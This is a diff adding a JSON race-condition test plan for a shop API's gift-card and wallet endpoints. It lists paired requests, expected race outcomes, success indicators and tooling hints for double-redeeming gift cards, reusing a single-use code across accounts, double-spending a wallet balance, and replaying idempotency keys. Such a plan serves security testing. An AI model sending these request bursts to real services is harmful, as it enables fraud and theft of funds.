@@ -1,0 +1,54 @@
+{
+  "endpoint": "POST https://shop.example.com/api/v1/gift-cards/redeem",
+  "state_object": "gift_card.redeemed_by flag and wallets.balance row for the redeeming user",
+  "hypotheses": [
+    {
+      "id": "gift_card_double_redeem",
+      "primitive": "read-modify-write",
+      "request_a": "POST /api/v1/gift-cards/redeem  Authorization: Bearer <user>  body {\"code\":\"WELCOME2026\"}",
+      "request_b": "<same as A>",
+      "expected_serial_outcome": "First call credits the wallet once and sets redeemed_by=user_id; second call returns 409/410 (already redeemed).",
+      "expected_race_outcome": "Both reads observe redeemed_by IS NULL before either write; both UPDATEs commit and balance is credited twice.",
+      "indicator": "Wallet balance increases by 2 * code.value after a 20-request burst, or two 200 OK responses both containing the same {\"credited\": <value>} payload.",
+      "exploit_value": "high",
+      "tooling_hint": "http2 single-packet"
+    },
+    {
+      "id": "gift_card_cross_account_drain",
+      "primitive": "TOCTOU",
+      "request_a": "POST /api/v1/gift-cards/redeem  Authorization: Bearer <user_alpha>  body {\"code\":\"WELCOME2026\"}",
+      "request_b": "POST /api/v1/gift-cards/redeem  Authorization: Bearer <user_beta>  body {\"code\":\"WELCOME2026\"}",
+      "expected_serial_outcome": "Whichever request lands first claims the code; the other receives 409.",
+      "expected_race_outcome": "Both accounts pass the redeemed_by IS NULL check; both wallets get credited from a single-use code.",
+      "indicator": "Both /api/v1/gift-cards/redeem calls return 200 with non-null credited value, AND a follow-up GET on the code shows redeemed_by set to only one of the users.",
+      "exploit_value": "high",
+      "tooling_hint": "turbo-intruder gate"
+    },
+    {
+      "id": "wallet_double_spend",
+      "primitive": "read-modify-write",
+      "request_a": "POST /api/v1/wallet/withdraw  Authorization: Bearer <user>  body {\"amount\":100,\"account\":\"acct_a\"}",
+      "request_b": "POST /api/v1/wallet/withdraw  Authorization: Bearer <user>  body {\"amount\":100,\"account\":\"acct_b\"}",
+      "expected_serial_outcome": "Second withdraw fails with insufficient_funds once the first commits.",
+      "expected_race_outcome": "Both SELECTs see balance >= 100; both UPDATEs subtract 100, leaving balance negative.",
+      "indicator": "Two 200 OK transfer confirmations and a subsequent GET /api/v1/wallet returning balance < 0, or both account ledgers showing successful deposits totalling more than the original wallet balance.",
+      "exploit_value": "critical",
+      "tooling_hint": "http2 single-packet"
+    },
+    {
+      "id": "idempotency_key_replay",
+      "primitive": "idempotency_key_replay",
+      "request_a": "POST /api/v1/gift-cards/redeem  Idempotency-Key: ABC  body {\"code\":\"WELCOME2026\"}",
+      "request_b": "POST /api/v1/gift-cards/redeem  Idempotency-Key: ABC  body {\"code\":\"WELCOME2026\"}",
+      "expected_serial_outcome": "Second request returns the cached response of the first without re-crediting.",
+      "expected_race_outcome": "Because the key is logged but not enforced, both requests are processed end-to-end like the double_redeem case.",
+      "indicator": "Both responses carry a different transaction_id even though Idempotency-Key was identical.",
+      "exploit_value": "medium",
+      "tooling_hint": "raw curl -Z"
+    }
+  ],
+  "non_targets": [
+    "GET /api/v1/wallet — read-only and not state-changing on its own; ruled out as a primitive (still useful as the indicator oracle)."
+  ],
+  "summary": "wallet_double_spend is the spiciest: read-modify-write on balance with no row lock means a single-packet burst can split one balance across multiple bank accounts."
+}
